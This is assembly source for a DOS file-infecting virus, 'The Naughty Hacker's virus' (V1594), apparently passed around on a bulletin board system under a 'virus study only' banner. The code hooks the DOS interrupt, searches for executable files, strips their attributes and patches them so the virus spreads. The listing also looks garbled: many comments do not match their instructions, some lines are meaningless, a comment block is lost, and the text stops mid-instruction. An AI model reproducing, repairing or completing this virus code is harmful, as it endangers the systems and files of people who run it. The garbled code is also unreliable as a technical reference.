;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
        .radix  16


        ;*********************************
        ;*   The Naughty Hacker's virus  *
        ;*VERSION 3.1 (And not the last.)*
        ;*          ( V1594 )            *
        ;*  Finished on the 10.04.1991   *
        ;*                               *
        ;*    Glad to meet you friend!   *
        ;*                               *
        ;*********************************

;
; "It's hard to find a black cat in a dark room, especially if it's not there."
;
;       V1594 (     !@!?!).
;  ()  ,      
;    ,        
;       ,   
;         .
;           ......
;

        code    segment
                assume cs:code,ds:code
                org 100h

len    = (offset last - start)/2

start:
        db 0E9, 1, 0                   ; Jump to next command.
old_21:                                ; Old INT 21 vector.
        db 0EA                           ; Near call?
int_21_call_int_21
        push ax                         ; Save old parameter.
        cmp ax,4B00h                    ; Spawn progvess?
        je inf                           ; Yes,go to infect.
        jmp short end                    ; No, jump to end.
inf:
        mov ax,3D02h                    ; Open file, read & write.
        int 21                          ; Call DOS.
        jnc set_prg_type               ; If no error go to set prg type.
        jmp short end                   ; If error go to end.
set_prg_type:
        xchg ax,bx                      ; Swap registers.
        mov al,0FFh                     ; FF type (COM/EXE).
        int 2F                          ; Call DOS.
        push es                         ; Store ES.
        mov ax,4202h                    ; Go EOF.
        cwd                             ; Set default value -> CX=0.
        xor dx,dx                       ; DX=0
        int 21                          ; Call DOS.
        pop es                          ; Get back ES.
        dec ax                          ; Back one word -> not AX-1!!!
        mov word ptr ds:[bx+4],ax       ; Set new AX-1.
        mov ah,3Fh                      ; Read from file.
        mov cx,len                      ; Parameter to read.
        mov dx,si                       ; Point to data -> buffer.
        int 21                          ; Call DOS.
        add ax,cx                       ; Calculate checksum.
        mov cx,ax                       ; Set CX = AX.
fix_tsr:
        mov ah,3Ch                      ; Close file.
        int 21                          ; Call DOS.
        cmp word ptr [si],0E9FAh       ; Bootstrp + JMP STAR?
        jne fix_com                      ; No, go to fix COM file.
        mov ax,4BFCh                    ; Set program type.
        int 21                          ; Call DOS.
        jmp short end                   ; That's all folks!
fix_com:
        cmp byte ptr [si],"N"           ; Infect NEW exe?
        je end                           ; Yes, that's all!
        mov byte ptr [si],"N"           ; No, clear marker.
        mov byte ptr [es:word ptr ds:[bx+4]],0EAh  ; TSR JMP STAR?
        mov word ptr [es:word ptr ds:[bx+4]+1],offset tsr_start  ; Int 21 offset.
        mov word ptr [es:word ptr ds:[bx+4]+3],es        ; Int 21 segment.


end:
        pop ax                          ; Get old parameter.
        mov dx,old_21[si]               ; Restore old INT 21 vector.
        mov ds,dx                       ; ?
        mov word ptr cs:[si+off_21-diff],dx
        mov word ptr cs:[si+seg_21-diff],dx
        cli                             ; Disable interrupt.
        mov dx,si                       ; Move current index into DI.
        mov si,dx                       ; Move index into SI.
        sti                             ; Enable interrupt.
        db 0EA                          ; Near call?
off_21:                                ; Diff. between two instances.
        dw diff-100
seg_21:
        dw diff-100

last:

diff    label word

tsr_int_21:
        pushf
        call dword ptr [old_21-int_21_call_int_21]
        ret
        int 21
tsr_start:
        cmp ah,3Dh                      ; Open file.
        je tsr_int_21
        cmp ah,4Bh                      ; Spawn process.
        je tsr_int_21
        cmp ah,4Fh                      ; First directory?
        jne tsr_exit
        cmp byte ptr ds:[dx],-1         ; COM file?
        jne tsr_exit
        mov bp,dx                       ; Set BP.
        mov ah,1Ah                      ; Set DTA.
        mov dx,dx                       ; Point to DTA.
        add dx,len+9                    ; Point to victim.
        int 21                          ; Call DOS.
        mov ah,2Fh                      ; Get DTA pointer.
        int 21                          ; Call DOS.
        mov dx,bx                       ; Store DTA pointer.
        mov ah,4Eh                      ; Find first file.
        mov cx,7                        ; Attributes.
find_next:
        int 21                          ; Call DOS.
        jc tsr_done                     ; No more files.
        mov dx,9                      ; Point to filename.
        mov ax,4301h                  ; Set file attributes.
        xor cx,cx                       ; No attributes.
        int 21                          ; Call DOS.
        mov ax,3D02h                    ; Open file.
        int 21                          ; Call DOS.
        xchg bx,ax                      ; Swap BX,AX.
        mov ah,3Fh                      ; Read from file.
        mov cx,4                        ; Parameter to read.
        mov dx,dx                       ; Point to data -> buffer.
        add dx,len                      ; Point to virus.
        int 21                          ; Call DOS.
        add ax,cx                       ; Calculate checksum.
        mov cx,ax                       ; Set CX = AX.
        pusha                           ; Save all regs.
        mov ax,4202h                    ; Go EOF.
        cwd                             ; Set default value -> CX=0.
        xor dx,dx                       ; DX=0
        int 21                          ; Call DOS.
        sub ax,4                        ; Subtract.
        mov word ptr ds:[bp+len+10h],ax ; Set new jump.
        popa                            ; Pop all registers.
        mov ah,3Ch                      ; Close file.
        int 21                          ; Call DOS.
        mov ah,1Ah                      ; Set DTA.
        mov dx,dx                       ; Point to DTA.
        add dx,9                        ; Point to victim.
        int 21                          ; Call DOS.
        mov ah,4Fh                      ; Find next file.
        jmp short find_next             ; Repeat.
tsr_done:
        mov dx,dx                       ; Point to DTA.
        add dx,len+9                    ; Point to victim.
        mov ah,1Ah                      ; Set DTA.
        int 21                          ; Call DOS.
        jmp tsr_exit
tsr_exit:
        push ds
        push es
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push es                         ; Push ES.
        mov ax,es                       ; Set DS = ES.
        mov ds,ax                       ; 
        mov ah,5A                       ; Check DOS version.
        int 21                          ; Call DOS.
        cmp al,0FEh                     ; DOS 2.X?
        jb  exit_tsr                    ; Below, jump.
        mov ah,5A                       ; Check DOS version.
        int 